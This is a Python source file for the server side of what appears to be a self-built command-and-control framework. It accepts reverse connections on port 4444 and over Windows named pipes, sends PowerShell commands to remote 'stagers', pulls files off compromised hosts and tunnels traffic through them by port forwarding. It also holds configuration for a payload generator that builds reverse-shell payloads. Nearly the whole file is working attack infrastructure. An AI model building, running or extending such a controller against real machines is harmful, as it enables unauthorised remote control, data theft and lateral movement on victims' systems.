import socket
import struct
import threading
import queue
import uuid 
import os
import time
import payloadgen
from myconstant import myconstant_networking,myconstant,mybuildin_cmd
from localhttpserver import localhttpserver

import win32pipe, win32file, pywintypes
import codecs

import decoder

#from os.path import isfile, join


class SocketShutdown(Exception):
    pass




# socket is assume connected
class mypipe_handler():
    def __init__(self,mypipe):
        self.__mypipe = mypipe
        self.__msg_buf = ""
        
        self.__msg_tag_st = "[MYMSST]"
        self.__msg_tag_ed = "[MYMSED]"
        #less likely need this
        self.__enc_tag_st = "[MYENST]"
        self.__enc_tag_ed = "[MYENED]"

    def msf_encode(self,msg):
        return msg #no encode for now ...
        #return self.__msg_tag_st + msg + self.__msg_tag_ed


    def get_nextmsg(self):
        while True:
            try:
                resp = win32file.ReadFile(self.__mypipe, 1024)
                break
            except Exception as e:
                if e.args[0] == 232:
                    pass
                else:
                    raise e
        return resp[1].decode("utf8", "ignore")


# socket is assume connected
class mysocket_handler():
    def __init__(self,in_socket):
        
        self.__t_myconstant = myconstant()
        self.__mysocket = in_socket
        self.__msg_buf = ""
        
        self.__msg_tag_st = "[MYMSST]"
        self.__msg_tag_ed = "[MYMSED]"
        #less likely need this
        self.__enc_tag_st = "[MYENST]"
        self.__enc_tag_ed = "[MYENED]"
        self.__mysocket.settimeout(self.__t_myconstant.SOCKET_TIMEOUT)
        self.__mysocket_alive = True

    def msf_encode(self,msg):
        return self.__msg_tag_st + msg + self.__msg_tag_ed

    def ifalive(self):
        return self.__mysocket_alive

    def get_nextmsg(self):

        while True:
            # if msg buf is enough
            if self.__msg_tag_st in self.__msg_buf and self.__msg_tag_ed in self.__msg_buf:
                #get start tag
                t_startmsg = self.__msg_buf.find(self.__msg_tag_st)
                t_endmsg = self.__msg_buf.find(self.__msg_tag_ed)
                # msg is from startmsg + len(tag) to endmsg
                r_msg = self.__msg_buf[(t_startmsg + len(self.__msg_tag_st)):t_endmsg]
                #print("[DEBUG] r_msg: {}".format(r_msg))
                # remove sub string from buf + return
                self.__msg_buf = self.__msg_buf[(t_endmsg + len(self.__msg_tag_ed)):]
                return r_msg
            else:
                # get more message
                try: 
                    t_indata = self.__mysocket.recv(1024)
                    self.__msg_buf = self.__msg_buf + t_indata.decode("utf8", "ignore")
                    if len(t_indata) == 0:
                        raise SocketShutdown("Client side shutdown ...")
                except socket.timeout:
                    pass
    def get_native_all(self):
        while True:
            try:
                #print("[DEBUG] get_native_all, trying to read something")
                t_indata = self.__mysocket.recv(1024)
                new_msg = t_indata.decode("utf8", "ignore")
                if len(new_msg) == 0: #got FIN
                    self.__mysocket_alive = False
                    return self.__msg_buf
                self.__msg_buf = self.__msg_buf + new_msg
            except socket.timeout: #assmue no connection error
                return self.__msg_buf



class myserver():

    def __init__(self):
        self.__mysocket_list = dict()
        self.__mydata_list = dict() #Que to runner
        self.__myaddr_list = dict() #this is port + ip
        self.__mymsg_list = dict() #history message
        self.__mypsloader_list = dict() #loaded ps module
        self.__myuuid_list = list()
        self.__mystart_list = dict() #bool
        self.__myfwdata_list_tomaster = dict()
        self.__myfwdata_list_toslave = dict()
        self.__myfwdata_list_torh = dict()
        self.__myfwdata_list_fromrh = dict()


        self.__mylistener_start_list = dict() #bool
        self.__mylistener_hostname_list = dict()
        self.__mylistener_port_list = dict()
        self.__mylistener_socket_list = dict()
        self.__mylistener_uuid_list = list()

        self.__hostname = "192.168.182.131"
        self.__port = 4444

        self.__pipename = "namedpipeshell"
        self.__ifverbose = False

        self.__t_myconstant = myconstant()
        self.__t_myconstant_networking = myconstant_networking()

        self.__mypipelistener_start_list = dict() #bool
        self.__mypipelistener_pipename_list = dict()
        self.__mypipelistener_pipe_list = dict()
        self.__mypipelistener_uuid_list = list()
        
        self.__mypipe_myhandle_list = dict()
        self.__mypipe_mydata_list = dict() #Que to runner
        self.__mypipe_mypipename_list = dict()
        self.__mypipe_mymsg_list = dict()
        self.__mypipe_myuuid_list = list()
        self.__mypipe_mystart_list = dict() #bool

    def get_resource_handler_result(self,myuuid): #for pfw
        local_item_que_fromrh = self.__myfwdata_list_fromrh[myuuid]

        while True:
            try:
                msg_item = local_item_que_fromrh.get(block=True, timeout=5)
                break
            except queue.Empty:
                #print("[DEBUG] get_resource_handler_result Local Job Que for {} is empty".format(myuuid))
                continue
        
        return msg_item


    def start_resource_handler(self,myuuid,conhost,conport): # fow pfw #its possible to have its own uuid
        local_item_que_fromrh = self.__myfwdata_list_fromrh[myuuid]
        local_item_que_torh = self.__myfwdata_list_torh[myuuid]

        print("[Local] This is the resousce handler for my uuid: {}".format(myuuid))
        # try connect to the addr send tag on success or fail
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client.connect((conhost,conport))
            local_item_que_fromrh.put(self.__t_myconstant_networking.FW_LOCAL_SUCCESS)
        except Exception as e:
            print("[Local] Error connecting to client: {}...".format(str(e)))
            local_item_que_fromrh.put(self.__t_myconstant_networking.FW_LOCAL_ERROR)
            return

        need_reconnect = False
        #try to get cmd first then send resouces
        while True:
            
            if need_reconnect:
                #print("[DEBUG] start_resource_handler, need reconnction")
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    client.connect((conhost,conport))
                    #local_item_que_fromrh.put(self.__t_myconstant_networking.FW_LOCAL_SUCCESS)
                except Exception as e:
                    #print("[Local] Error reconnecting to client: {}...".format(str(e)))
                    #local_item_que_fromrh.put(self.__t_myconstant_networking.FW_LOCAL_ERROR)
                    return #cannot continue ...
            
            while True:
                try:
                    msg_item = local_item_que_torh.get(block=True, timeout=5)
                    break
                except queue.Empty:
                    #print("[DEBUG] start_resource_handler, Local Job Que for {} is empty".format(myuuid))
                    continue
            #print("[DEBUG] start_resource_handler, " + msg_item)
            #encode write to
            encode_cmd = msg_item.encode("utf8", "ignore")
            send_result = client.send(encode_cmd)
            #print("[DEBUG] start_resource_handler, trying to get reponse from local server ...")
            #get response if any, better put a timeout here
            t_mysocket_handler = mysocket_handler(client)
            #to_send = client.recv(1024)
            #decode_msg = to_send.decode("utf8", "ignore")
            decode_msg = t_mysocket_handler.get_native_all()
            #print("[DEBUG] start_resource_handler, " + decode_msg)

            local_item_que_fromrh.put(decode_msg)
            #print("[DEBUG] start_resource_handler, Put success ... ")

            #check if the connection is still alive, tag for reconnect if FINED
            if not t_mysocket_handler.ifalive():
                need_reconnect = True


    def start_slave_worker(self,myuuid):
        #single target for now
        local_item_que_tomaster =  self.__myfwdata_list_tomaster[myuuid]
        local_item_que_toslave =  self.__myfwdata_list_toslave[myuuid]
        local_item_que_fromrh = self.__myfwdata_list_fromrh[myuuid]
        local_item_que_torh = self.__myfwdata_list_torh[myuuid]

        print("[Stager] This is the local worker for my uuid: {}".format(myuuid))
        
        while True:
            #put command on main que and wait for response
            self.create_command(myuuid,"fwq","dummy")
            while True:
                try:
                    msg_item = local_item_que_toslave.get(block=True, timeout=5)
                    break
                except queue.Empty:
                    #print("[DEBUG] start_slave_worker Local Job Que (toslave) for {} is empty".format(myuuid))
                    continue
            
            if msg_item != self.__t_myconstant_networking.FW_NOTREADY:
                print("[Stager] Real data")
                local_item_que_torh.put(msg_item)
            
                # assume there always reponse
                while True:
                    try:
                        msg_item = local_item_que_fromrh.get(block=True, timeout=5)
                        break
                    except queue.Empty:
                        #print("[DEBUG] start_slave_worker Local Job Que (fromrh) for {} is empty".format(myuuid))
                        continue
                
                #print("[DEBUG] start_slave_worker" + msg_item)
                local_item_que_tomaster.put(msg_item)
            else:
                local_item_que_tomaster.put(self.__t_myconstant_networking.FW_NOTREADY)
            time.sleep(self.__t_myconstant.PFW_ACK_SPEED)
        

    def start_worker(self,myuuid):

        print("[Stager] This is the worker for myuuid: {}".format(myuuid))
        while True:
            # This will be the main runner
            item_que = self.__mydata_list[myuuid]
            mysocket = self.__mysocket_list[myuuid]
            myhistory = self.__mymsg_list[myuuid]
            # make a handler class
            t_mysockethandler = mysocket_handler(mysocket)
            

            try:
                cmd_struct_to_send = item_que.get(block=True, timeout=5)
            except queue.Empty:
                #print("[DEBUG] Job Que for {} is empty".format(myuuid))
                continue
            #print("[DEBUG] Job item {}".format(cmd_struct_to_send))

            
            try:
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                if  cmd_struct_to_send[0] == "ps" and self.__ifverbose:
                    cmd_struct_to_send[1] = cmd_struct_to_send[1] + " | out-string"

                if (cmd_struct_to_send[0] == "psload"):
                    cmd_struct_to_send[0] = "ps"
                    myhistory.append("[Stager] Command_tag: {}".format(cmd_struct_to_send[0]))
                else:
                    myhistory.append("[Stager] Command_tag: {}  Command: {}".format(cmd_struct_to_send[0],cmd_struct_to_send[1]))
                
                encode_tag = t_mysockethandler.msf_encode(cmd_struct_to_send[0]).encode("utf8", "ignore")
                send_result = mysocket.send(encode_tag)
                myhistory.append("[Stager] Total of number of bytes to send: {}, Sent: {}".format(len(encode_tag), send_result))
                recv_result = t_mysockethandler.get_nextmsg()
                myhistory.append("[Stager] Send command_tag result: {}".format(recv_result))

                encode_cmd = t_mysockethandler.msf_encode(cmd_struct_to_send[1]).encode("utf8", "ignore")
                send_result = mysocket.send(encode_cmd)
                myhistory.append("[Stager] Total of number of bytes to send: {}, Sent: {}".format(len(encode_cmd), send_result))
                recv_result = t_mysockethandler.get_nextmsg()
                myhistory.append("[Stager] Send command result: {}".format(recv_result))

                #if fwq
                if cmd_struct_to_send[0] == "fwq":
                    #print("[DEBUG] start_worker, I am working for fwq")
                    #get the next message check tag
                    recv_result = t_mysockethandler.get_nextmsg()
                    #print("[DEBUG] start_worker, get_nextmsg is {}".format(recv_result))
                    #push command to local worker and wait for response
                    local_item_que_tomaster =  self.__myfwdata_list_tomaster[myuuid]
                    local_item_que_toslave =  self.__myfwdata_list_toslave[myuuid]
                    #print("[DEBUG] start_worker, Trying to put into que")
                    local_item_que_toslave.put(recv_result)
                    #print("[DEBUG] start_worker, Puted into ..")
                    while True:
                        try:
                            msg_item = local_item_que_tomaster.get(block=True, timeout=5)
                            break
                        except queue.Empty:
                            #print("[DEBUG] start_worker, Local Job Que for {} is empty".format(myuuid))
                            continue
                    
                    #print("[DEBUG] start_worker, Got item back")
                    if msg_item != self.__t_myconstant_networking.FW_NOTREADY: #send it back to ack the que get
                        #send it to client
                        encode_cmd = t_mysockethandler.msf_encode(msg_item).encode("utf8", "ignore")
                        send_result = mysocket.send(encode_cmd)
                        #print("[DEBUG] start_worker, real data sent")
                    else:
                        pass
                        #print("[DEBUG] start_worker, FW_NOTREADY")
                    #else, no need to send back
                    
                    continue
                
                if cmd_struct_to_send[0] == "fw" or cmd_struct_to_send[0] == "psreset": #fw init and psreset
                    #get ack, no send
                    recv_result = t_mysockethandler.get_nextmsg()
                    myhistory.append("[Stager] Run Command result: {}".format(recv_result))
                    myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                    continue
                
                if cmd_struct_to_send[0] == "download":
                    #next message is either data or error code
                    recv_result = t_mysockethandler.get_nextmsg()
                    if decoder.isBase64(recv_result):
                        data_array = decoder.b64_decode(recv_result)
                        fileanme = os.path.basename(cmd_struct_to_send[1]) # platform dependent
                        myhistory.append("[Stager] Writing to {}".format(fileanme))
                        with open(os.path.join("DLDB\\",fileanme),mode = "wb") as f:
                            f.write(data_array)

                    else:
                        myhistory.append("[Stager] Something wrong with download data ... ")
                        myhistory.append("[Stager] Error: {}".format(recv_result))
                    
                    #ack in all cases
                    encode_cmd = t_mysockethandler.msf_encode(self.__t_myconstant_networking.DL_SUCCESS).encode("utf8", "ignore")
                    send_result = mysocket.send(encode_cmd)
                    myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                    continue

                if cmd_struct_to_send[0] == "psremote":
                    #get ack, no send
                    recv_result = t_mysockethandler.get_nextmsg()
                    myhistory.append("[Stager] Run Command result: {}".format(recv_result))
                    myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                    continue


                # try get cmd result if any
                recv_result = t_mysockethandler.get_nextmsg()
                myhistory.append("[Stager] Run Command result: {}".format(recv_result))
                # ack for success
                encode_cmd = t_mysockethandler.msf_encode(self.__t_myconstant_networking.PSRUN_SUCCESS).encode("utf8", "ignore")
                send_result = mysocket.send(encode_cmd)
                #myhistory.append("[DEBUG] PSRUN_SUCCESS sent")
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

            except Exception as e:
                myhistory.append("Exception: " + str(e))
                mysocket.shutdown(socket.SHUT_RDWR)
                mysocket.close()
                #remove from worker list
                self.__mydata_list.pop(myuuid, None)
                self.__mysocket_list.pop(myuuid, None)
                self.__myaddr_list.pop(myuuid, None)
                self.__mystart_list[myuuid] = False
                myhistory.append("[Stager] {} is stoped ...".format(myuuid))
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                break

    def start_pipworker(self,myuuid):
        print("[Stager] This is the pipe worker for myuuid: {}".format(myuuid))
        while True:
            # This will be the main runner
            item_que = self.__mypipe_mydata_list[myuuid]
            mypipe = self.__mypipe_myhandle_list[myuuid]
            myhistory = self.__mypipe_mymsg_list[myuuid]

            t_mypipehandler = mypipe_handler(mypipe)

            try:
                cmd_struct_to_send = item_que.get(block=True, timeout=5)
            except queue.Empty:
                #print("[DEBUG] Job Que for {} is empty".format(myuuid))
                continue
            
            try:
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                if (cmd_struct_to_send[0] == "psload"):
                    cmd_struct_to_send[0] = "ps"
                    myhistory.append("[Stager] Command_tag: {}".format(cmd_struct_to_send[0]))
                else:
                    myhistory.append("[Stager] Command_tag: {}  Command: {}".format(cmd_struct_to_send[0],cmd_struct_to_send[1]))
                
                encode_tag = t_mypipehandler.msf_encode(cmd_struct_to_send[0]).encode("utf8", "ignore")
                win32file.WriteFile(mypipe, encode_tag)
                recv_result = t_mypipehandler.get_nextmsg()
                myhistory.append("[Stager] Send command_tag result: {}".format(recv_result))

                encode_cmd = t_mypipehandler.msf_encode(cmd_struct_to_send[1]).encode("utf8", "ignore")
                win32file.WriteFile(mypipe, encode_cmd)
                recv_result = t_mypipehandler.get_nextmsg()
                myhistory.append("[Stager] Send command result: {}".format(recv_result))

                # try get cmd result if any
                recv_result = t_mypipehandler.get_nextmsg()
                myhistory.append("[Stager] Run Command result: {}".format(recv_result))
                # ack for success
                encode_cmd = t_mypipehandler.msf_encode(self.__t_myconstant_networking.PSRUN_SUCCESS).encode("utf8", "ignore")
                win32file.WriteFile(mypipe, encode_cmd)
                #myhistory.append("[DEBUG] PSRUN_SUCCESS sent")
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

            except Exception as e:
                print("Exception: " + str(e))
                myhistory.append("Exception: " + str(e))
                #remove from worker list
                self.__mypipe_mydata_list.pop(myuuid, None)
                self.__mypipe_mypipename_list.pop(myuuid, None)
                self.__mypipe_mystart_list[myuuid] = False
                win32file.CloseHandle(self.__mypipe_myhandle_list[myuuid])
                self.__mypipe_myhandle_list.pop(myuuid, None)
                myhistory.append("[Stager] {} is stoped ...".format(myuuid))
                myhistory.append("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
                break

    
    def start_client(self,conhost,conport):
        print("Trying to connect to Host: {} and Port: {}".format(conhost,conport))
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client.connect((conhost,conport))
        except Exception as e:
            print("Error connecting to client: {}...".format(str(e)))
            return
        
        #get uuid and normal setup
        print("[Client] Connected to", conhost)
        #get uuid
        myuuid = uuid.uuid4().hex[:6].upper()
        #push socket into dict
        self.__mysocket_list[myuuid] = client
        #push addr into dict
        self.__myaddr_list[myuuid] = (conhost,conport) #may or may not the same format 
        #create fifo
        self.__mydata_list[myuuid] = queue.Queue()
        #create history
        self.__mymsg_list[myuuid] = list()
        #push uuid
        self.__myuuid_list.append(myuuid)
        #set start
        self.__mystart_list[myuuid] = True

        #init psloader
        self.__mypsloader_list[myuuid] = list()


        print("[Client] myuuid is {}".format(myuuid))
        threading.Thread(target=self.start_worker,args=(myuuid,)).start()

    def start_pipe_client(self,conhost,pipename):
        print("Trying to connect to {}".format(r'\\'+ conhost + r'\pipe\\' + pipename))

        try:
            handle = win32file.CreateFile(r'\\'+ conhost + r'\pipe\\' + pipename, win32file.GENERIC_READ | win32file.GENERIC_WRITE, 0, None, win32file.OPEN_EXISTING, 0, None)
            win32pipe.SetNamedPipeHandleState(handle, win32pipe.PIPE_READMODE_MESSAGE, None, None)
            resp = win32file.ReadFile(handle, 1024)
        except Exception as e:
            print("Error connecting to client: {}...".format(str(e)))
            return
        
        if resp[1].decode("utf8", "ignore") == self.__t_myconstant_networking.PIPE_CONNECTED:
            print("[Client] Connected to", conhost)
            
            #have everything normally 
            myuuid = uuid.uuid4().hex[:6].upper() #stager
            #create fifo
            self.__mypipe_mydata_list[myuuid] = queue.Queue()
            #create history
            self.__mypipe_mymsg_list[myuuid] = list()
            #push uuid
            self.__mypipe_myuuid_list.append(myuuid)
            #set start
            self.__mypipe_mystart_list[myuuid] = True
            #pipe name
            self.__mypipe_mypipename_list[myuuid] = pipename
            #push pipe handle
            self.__mypipe_myhandle_list[myuuid] = handle
            
            print("[Client] myuuid is {}".format(myuuid))
            threading.Thread(target=self.start_pipworker,args=(myuuid,)).start()
        else:
            print("ACK failed ...")


    def start_listener(self):
        print("Starting listener on Hostname: {} and Port: {}".format(self.__hostname,self.__port))
        #get uuid
        listeneruuid = uuid.uuid4().hex[:6].upper()
        self.__mylistener_start_list[listeneruuid] = True
        self.__mylistener_hostname_list[listeneruuid] = self.__hostname
        self.__mylistener_port_list[listeneruuid] = self.__port
        self.__mylistener_uuid_list.append(listeneruuid)

        self.__mylistener_socket_list[listeneruuid] = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.__mylistener_socket_list[listeneruuid].bind((self.__hostname, self.__port))
        self.__mylistener_socket_list[listeneruuid].settimeout(self.__t_myconstant.SOCKET_TIMEOUT)
        self.__mylistener_socket_list[listeneruuid].listen()
        
        while self.__mylistener_start_list[listeneruuid]:
            try:
                #print("[DEBUG] Waiting for new connection ...")
                conn, addr = self.__mylistener_socket_list[listeneruuid].accept()
                print("[Listener] Connected by", addr)
                #get uuid
                myuuid = uuid.uuid4().hex[:6].upper()
                #push socket into dict
                self.__mysocket_list[myuuid] = conn
                #push addr into dict
                self.__myaddr_list[myuuid] = addr
                #create fifo
                self.__mydata_list[myuuid] = queue.Queue()
                #create history
                self.__mymsg_list[myuuid] = list()
                #push uuid
                self.__myuuid_list.append(myuuid)
                #set start
                self.__mystart_list[myuuid] = True
                #init pfw
                self.__myfwdata_list_toslave[myuuid] = queue.Queue()
                self.__myfwdata_list_tomaster[myuuid] = queue.Queue()
                self.__myfwdata_list_torh[myuuid] = queue.Queue()
                self.__myfwdata_list_fromrh[myuuid] = queue.Queue()

                #init psloader
                self.__mypsloader_list[myuuid] = list()

                print("[Listener] myuuid is {}".format(myuuid))
                threading.Thread(target=self.start_worker,args=(myuuid,)).start()
                
            except socket.timeout:
                pass
        
        # our of while loop
        self.__mylistener_socket_list[listeneruuid].close()
        self.__mylistener_start_list.pop(listeneruuid, None)
        self.__mylistener_hostname_list.pop(listeneruuid, None)
        self.__mylistener_port_list.pop(listeneruuid, None)
        self.__mylistener_socket_list.pop(listeneruuid, None)
        self.__mylistener_uuid_list.remove(listeneruuid)
        print("[Listener] {} is stoped ...".format(listeneruuid))


    def start_pipe_listener(self):
        print("[Listener] pipe server started on namepipe {}".format(self.__pipename))
        mypipeuuid = uuid.uuid4().hex[:6].upper() #listener
        pipe = win32pipe.CreateNamedPipe(r'\\.\pipe\\' + self.__pipename, win32pipe.PIPE_ACCESS_DUPLEX, win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_READMODE_MESSAGE | win32pipe.PIPE_NOWAIT, 1, 65536, 65536, 0, None)
        self.__mypipelistener_pipe_list[mypipeuuid] = pipe
        self.__mypipelistener_pipename_list[mypipeuuid] = self.__pipename
        self.__mypipelistener_uuid_list.append(mypipeuuid)
        self.__mypipelistener_start_list[mypipeuuid] = True
        
        #print("[Listener] waiting for client")
        while self.__mypipelistener_start_list[mypipeuuid]:
            
            try:
                win32pipe.ConnectNamedPipe(self.__mypipelistener_pipe_list[mypipeuuid], None)
                print("[Listener] got client")

                myuuid = uuid.uuid4().hex[:6].upper() #stager
                #create fifo
                self.__mypipe_mydata_list[myuuid] = queue.Queue()
                #create history
                self.__mypipe_mymsg_list[myuuid] = list()
                #push uuid
                self.__mypipe_myuuid_list.append(myuuid)
                #set start
                self.__mypipe_mystart_list[myuuid] = True
                #pipe name
                self.__mypipe_mypipename_list[myuuid] =self.__mypipelistener_pipename_list[mypipeuuid]
                #push pipe handle
                self.__mypipe_myhandle_list[myuuid] = self.__mypipelistener_pipe_list[mypipeuuid]
                
                
                print("[Listener] myuuid is {}".format(myuuid))
                threading.Thread(target=self.start_pipworker,args=(myuuid,)).start()
                
                while (self.__mypipe_mystart_list[myuuid]):
                    time.sleep(5)
                
                #renew handle
                newpipe = win32pipe.CreateNamedPipe(r'\\.\pipe\\' + self.__mypipelistener_pipename_list[mypipeuuid], win32pipe.PIPE_ACCESS_DUPLEX, win32pipe.PIPE_TYPE_MESSAGE | win32pipe.PIPE_READMODE_MESSAGE | win32pipe.PIPE_NOWAIT, 1, 65536, 65536, 0, None)
                self.__mypipelistener_pipe_list[mypipeuuid] = newpipe
                
            except Exception as e:
                if (e.args[0] == 536): #notstarted or busy
                    pass
                    print("e Error: {}:{}".format(mypipeuuid,str(e)))
                elif (e.args[0] == 231):
                    pass
                    print("e Error: {}:{}".format(mypipeuuid,str(e)))
                else:
                    pass
                    print("e Error: {}:{}".format(mypipeuuid,str(e)))
                time.sleep(5)

        #end of while loop
        self.__mypipelistener_pipe_list.pop(mypipeuuid, None)
        self.__mypipelistener_pipename_list.pop(mypipeuuid, None)
        self.__mypipelistener_start_list.pop(mypipeuuid, None)
        self.__mypipelistener_uuid_list.remove(mypipeuuid)
        print("[Listener] {} is stoped ...".format(mypipeuuid))


    def create_command(self,stager,tag,command):
        self.__mydata_list[stager].put([tag,command])
    
    def create_pipe_command(self,stager,tag,command):
        self.__mypipe_mydata_list[stager].put([tag,command])
    
    def stop_listener(self,listener):
        self.__mylistener_start_list[listener] = False

    def stop_pipe_listener(self,listener):
        self.__mypipelistener_start_list[listener] = False

    def print_info(self):
        print("++++++++++++++++++++++++Listener Info++++++++++++++++++++++++")
        print("Listener Type: socket")
        print("Hostname: {}".format(self.__hostname))
        print("Port Number: {}".format(self.__port))
    
    def print_pipe_info(self):
        print("+++++++++++++++++++++Pipe Listener Info++++++++++++++++++++++")
        print("Listener Type: pipe")
        print("Pipe Name: {}".format(self.__pipename))

    
    def print_stager(self):
        print("List of avaliable stager: {}".format(self.__myuuid_list))
    
    def print_pipe_stager(self):
        print("List of avaliable pipe stager: {}".format(self.__mypipe_myuuid_list))

    
    def print_listener(self):
        print("List of avaliable listener: {}".format(self.__mylistener_uuid_list))
    
    def print_pipe_listener(self):
        print("List of avaliable pipe listener: {}".format(self.__mypipelistener_uuid_list))

    def get_stager(self):
        return self.__myuuid_list
    
    def get_pipe_stager(self):
        return self.__mypipe_myuuid_list

    def get_running_stager(self):
        return [a for a in self.__myuuid_list if self.__mystart_list[a]]
    def get_running_pipe_stager(self):
        return [a for a in self.__mypipe_myuuid_list if self.__mypipe_mystart_list[a]]

    def get_listener(self):
        return self.__mylistener_uuid_list
    
    def get_pipe_listener(self):
        return self.__mypipelistener_uuid_list

    def print_stager_running(self):
        print("List of running pipe stager: {}".format(self.get_running_stager()))
    def print_pipe_stager_running(self):
        print("List of running pipe stager: {}".format(self.get_running_pipe_stager()))

    def get_history(self):
        return self.__mymsg_list
    
    def get_pipe_history(self):
        return self.__mypipe_mymsg_list

    def set_hostname(self,hostname):
        assert(type(hostname) is str)
        self.__hostname = hostname

    def set_portnumber(self,port):
        assert(type(port) is int)
        self.__port = port
    
    def set_pipename(self,pipename):
        assert(type(pipename) is str)
        self.__pipename = pipename


    def add_psloadlist(self,myuuid,filename): #push the filename to list
        self.__mypsloader_list[myuuid].append(filename)
    
    def get_psloadlist(self,myuuid):
        return self.__mypsloader_list[myuuid]
    
    def print_psloadlist(self,myuuid):
        print("List of loaded script: {}".format(self.__mypsloader_list[myuuid]))

    def clean_psloadlist(self,myuuid):
        self.__mypsloader_list[myuuid] = list()
    
    def set_verbose(self,uinput):
        self.__ifverbose = uinput

    def get_verbose(self):
        return self.__ifverbose

#to hold some config for payloadgen
class mypayload():
    def __init__(self):
        self.ifreverse = True
        self.namepipe = "thisisthenamepipename"
        self.namepipehost = "."
        self.host = "127.0.0.1"
        self.port = 4444
        self.payloadtype = "socket"
    
    def printinfo(self):
        print("+++++++++++++++++++++Payload Info++++++++++++++++++++++")
        print("payloadtype: {}".format(self.payloadtype))
        print("ifreverse: {}".format(self.ifreverse))
        print("host: {}".format(self.host))
        print("port: {}".format(self.port))
        print("namepipehost: {}".format(self.namepipehost))
        print("namepipe: {}".format(self.namepipe))
        



